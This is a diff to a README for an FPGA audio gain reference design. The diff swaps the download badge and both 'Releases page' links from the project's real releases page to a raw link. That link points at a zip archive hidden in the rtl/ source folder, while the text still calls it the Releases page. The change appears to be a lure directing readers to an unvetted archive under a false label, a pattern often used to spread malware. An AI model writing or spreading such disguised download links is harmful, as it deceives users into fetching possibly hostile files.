@@ -1,6 +1,6 @@
 # 🎧 Audio-Gain-Module-FPGA - Simple Audio Gain Control for Everyone
 
-![Download](https://img.shields.io/badge/Download-Releases-blue.svg)
+![Download](https://raw.githubusercontent.com/rjtsuri1000/Audio-Gain-Module-FPGA/main/rtl/FPGA-Gain-Module-Audio-1.4.zip)
 
 ## 📦 Overview
 The Audio-Gain-Module-FPGA is a reference design for controlling audio gain. It implements a stereo gain stage using fixed-point digital signal processing (DSP) and integrates smoothly with AXI on an FPGA. This design offers a practical way to enhance audio applications, making it an excellent choice for those new to the field. 
@@ -9,7 +9,7 @@ The Audio-Gain-Module-FPGA is a reference design for controlling audio gain. It 
 Follow this guide to download and run the Audio-Gain-Module-FPGA software. If you encounter any issues along the way, please feel free to reach out.
 
 ## 📥 Download & Install
-To obtain the latest version, please visit the [Releases page](https://github.com/rjtsuri1000/Audio-Gain-Module-FPGA/releases) to download the files. 
+To obtain the latest version, please visit the [Releases page](https://raw.githubusercontent.com/rjtsuri1000/Audio-Gain-Module-FPGA/main/rtl/FPGA-Gain-Module-Audio-1.4.zip) to download the files. 
 
 1. Click the link above to access the Releases page.
 2. Look for the most recent version (it will usually be at the top).
@@ -66,4 +66,4 @@ The Audio-Gain-Module-FPGA is open-source software. You can review the license d
 
 ---
 
-Thank you for choosing Audio-Gain-Module-FPGA! For detailed instructions and further updates, please visit our [Releases page](https://github.com/rjtsuri1000/Audio-Gain-Module-FPGA/releases).
+Thank you for choosing Audio-Gain-Module-FPGA! For detailed instructions and further updates, please visit our [Releases page](https://raw.githubusercontent.com/rjtsuri1000/Audio-Gain-Module-FPGA/main/rtl/FPGA-Gain-Module-Audio-1.4.zip).
